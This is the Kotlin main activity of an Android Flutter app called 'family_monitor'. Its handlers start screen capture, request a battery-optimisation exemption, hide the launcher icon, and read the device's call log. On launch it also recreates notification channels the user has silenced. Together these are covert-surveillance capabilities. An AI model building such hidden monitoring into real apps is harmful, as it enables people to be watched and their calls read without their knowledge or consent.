package com.example.family_monitor

import android.app.Activity
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import android.os.PowerManager
import android.content.Context

class MainActivity : FlutterActivity() {

    companion object {
        private const val SCREEN_CAPTURE_CHANNEL =
            "com.familymonitor/screen_capture"
        private const val REQUEST_MEDIA_PROJECTION = 1001
    }

    private var pendingResult: MethodChannel.Result? = null

    private lateinit var projectionManager:
        MediaProjectionManager

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        ensureNotificationChannels()
        // Delete stale notification channels that may have been cached with
        // IMPORTANCE_NONE by a previous install — Android caches channel settings
        // and ignores recreation attempts unless the channel is deleted first.
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val nm = getSystemService(android.app.NotificationManager::class.java)
            listOf("family_monitor_bg", "family_monitor_channel", "fm_bg_sync").forEach { id ->
                val ch = nm.getNotificationChannel(id)
                if (ch != null && ch.importance == android.app.NotificationManager.IMPORTANCE_NONE) {
                    nm.deleteNotificationChannel(id)
                    android.util.Log.d("MainActivity", "Deleted stale channel: $id")
                }
            }
        }

        projectionManager =
            getSystemService(
                MEDIA_PROJECTION_SERVICE
            ) as MediaProjectionManager
    }

    @Suppress("DEPRECATION", "OVERRIDE_DEPRECATION")
    override fun onActivityResult(
        requestCode: Int,
        resultCode: Int,
        data: Intent?
    ) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode != REQUEST_MEDIA_PROJECTION) return

        val pending = pendingResult
        pendingResult = null

        if (resultCode == Activity.RESULT_OK && data != null) {

            val serviceIntent =
                Intent(
                    this,
                    ScreenCaptureService::class.java
                ).apply {
                    putExtra(
                        ScreenCaptureService.EXTRA_RESULT_CODE,
                        resultCode
                    )

                    putExtra(
                        ScreenCaptureService.EXTRA_RESULT_DATA,
                        data
                    )
                }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }

            pending?.success(true)
        } else {
            pending?.success(false)
        }
    }

    override fun configureFlutterEngine(
        flutterEngine: FlutterEngine
    ) {
        super.configureFlutterEngine(flutterEngine)

        MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            SCREEN_CAPTURE_CHANNEL
        ).setMethodCallHandler { call, result ->

            when (call.method) {

                "requestProjection" -> {
                    if (pendingResult != null) {
                        result.error(
                            "BUSY",
                            "Projection request already running",
                            null
                        )

                        return@setMethodCallHandler
                    }

                    pendingResult = result

                    @Suppress("DEPRECATION")
                    startActivityForResult(
                        projectionManager.createScreenCaptureIntent(),
                        REQUEST_MEDIA_PROJECTION
                    )
                }

                "isProjectionActive" -> {
                    result.success(
                        ScreenCaptureService.projectionToken != null
                    )
                }

                "releaseProjection" -> {
                    try {
                        ScreenCaptureService.projectionToken?.stop()
                    } catch (_: Exception) {}

                    result.success(null)
                }

                "requestBatteryOptimizationExemption" -> {
                    try {
                        val intent = Intent(
                            android.provider.Settings
                                .ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                        )

                        intent.data = android.net.Uri.parse(
                            "package:$packageName"
                        )

                        startActivity(intent)

                        result.success(true)
                    } catch (e: Exception) {
                        result.error(
                            "BATTERY_OPT_ERROR",
                            e.message,
                            null
                        )
                    }
                }

                "isBatteryOptimizationExempt" -> {
                    try {
                        val powerManager =
                            getSystemService(POWER_SERVICE)
                                as android.os.PowerManager

                        result.success(
                            powerManager.isIgnoringBatteryOptimizations(
                                packageName
                            )
                        )
                    } catch (e: Exception) {
                        result.success(false)
                    }
                }

                "hideAppIcon" -> {
                    try {
                        val componentName = android.content.ComponentName(
                            this,
                            "com.example.family_monitor.LauncherAlias"
                        )
                        packageManager.setComponentEnabledSetting(
                            componentName,
                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                            android.content.pm.PackageManager.DONT_KILL_APP
                        )
                        result.success(true)
                    } catch (e: Exception) {
                        result.error("HIDE_ICON_ERROR", e.message, null)
                    }
                }

                "showAppIcon" -> {
                    try {
                        val componentName = android.content.ComponentName(
                            this,
                            "com.example.family_monitor.LauncherAlias"
                        )
                        packageManager.setComponentEnabledSetting(
                            componentName,
                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                            android.content.pm.PackageManager.DONT_KILL_APP
                        )
                        result.success(true)
                    } catch (e: Exception) {
                        result.error("SHOW_ICON_ERROR", e.message, null)
                    }
                }

                "readCallLog" -> {
                    try {
                        val cursor = contentResolver.query(
                            android.provider.CallLog.Calls.CONTENT_URI,
                            arrayOf(
                                android.provider.CallLog.Calls.NUMBER,
                                android.provider.CallLog.Calls.CACHED_NAME,
                                android.provider.CallLog.Calls.TYPE,
                                android.provider.CallLog.Calls.DATE,
                                android.provider.CallLog.Calls.DURATION
                            ),
                            null, null,
                            "${android.provider.CallLog.Calls.DATE} DESC"
                        )
                        val list = mutableListOf<Map<String, Any?>>()
                        var count = 0
                        cursor?.use { c ->
                            while (c.moveToNext() && count < 150) {
                                val typeInt = c.getInt(
                                    c.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE))
                                val typeStr = when (typeInt) {
                                    android.provider.CallLog.Calls.INCOMING_TYPE -> "incoming"
                                    android.provider.CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                                    android.provider.CallLog.Calls.MISSED_TYPE   -> "missed"
                                    else -> "unknown"
                                }
                                list.add(mapOf(
                                    "number"   to (c.getString(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER)) ?: ""),
                                    "name"     to (c.getString(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.CACHED_NAME)) ?: ""),
                                    "type"     to typeStr,
                                    "date"     to c.getLong(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE)),
                                    "duration" to c.getLong(c.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION))
                                ))
                                count++
                            }
                        }
                        result.success(list)
                    } catch (e: Exception) {
                        result.error("CALL_LOG_ERROR", e.message, null)
                    }
                }

                else -> {
                    result.notImplemented()
                }
            }
        }
    }
    private fun ensureNotificationChannels() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val nm = getSystemService(android.app.NotificationManager::class.java)
            val required = mapOf(
                "family_monitor_bg"      to "Family Monitor Background",
                "family_monitor_channel" to "Family Monitor Service",
                "fm_bg_sync"             to "FM Background Sync"
            )
            required.forEach { (id, name) ->
                val existing = nm.getNotificationChannel(id)
                if (existing == null ||
                    existing.importance == android.app.NotificationManager.IMPORTANCE_NONE) {
                    nm.deleteNotificationChannel(id)
                    nm.createNotificationChannel(
                        android.app.NotificationChannel(
                            id, name,
                            android.app.NotificationManager.IMPORTANCE_LOW
                        ).apply { setShowBadge(false) }
                    )
                }
            }
        }
    }

}
